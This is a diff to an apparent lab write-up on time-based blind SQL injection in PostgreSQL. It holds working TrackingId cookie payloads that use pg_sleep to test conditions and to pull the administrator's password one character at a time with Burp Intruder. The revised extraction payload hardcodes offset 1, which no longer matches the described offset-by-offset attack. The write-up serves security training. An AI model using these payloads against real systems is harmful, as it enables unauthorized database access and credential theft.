@@ -14,11 +14,11 @@ Extract the administrator's password using response timing as the only signal.
 
 **Confirming conditional delay works:**
 
-TrackingId=x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+TrackingId=x'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
 
 10-second delay — condition true.
 
-TrackingId=x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--
+TrackingId=x'%3BSELECT+CASE+WHEN+(1=2)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
 
 Instant response — condition false.
 
@@ -28,7 +28,7 @@ Instant response — condition false.
 
 **Extracting the password — Cluster Bomb + brute force again, same approach as Labs 10 and 12:**
 
-TrackingId=x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+TrackingId=x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
 
 
 ![Intruder Cluster Bomb setup with offset and character payload positions](images/lab15-step2-intruder-setup.png)
@@ -40,7 +40,7 @@ One key difference from the earlier Intruder attacks: this one has to run **sing
 
 Read the results by the **response time column** instead of a grep match or status code — one payload per offset came back around 10,000ms while everything else returned near-instantly. Those slow rows reconstructed the password one character at a time.
 
-![Intruder results showing one high-latency row per offset](images/lab15-step3-results.png)
+![Intruder set-up](images/lab15-step3-results.png)
 
 ## Result
 
